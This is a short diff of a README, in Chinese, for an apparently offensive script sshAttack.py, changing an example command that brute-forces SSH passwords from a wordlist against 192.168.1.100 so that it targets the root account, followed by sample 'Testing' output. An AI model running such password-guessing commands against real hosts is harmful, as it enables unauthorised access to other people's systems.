@@ -90,7 +90,7 @@ More Help: PortScan.py -h
 	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断
 
 例：
-➜  py python sshAttack.py -H 192.168.1.100 -u zhanghe -f password.md -c 20
+➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
 		[-] Testing: 1111
 		[-] Testing: 2222
 		[-] Testing: 3333
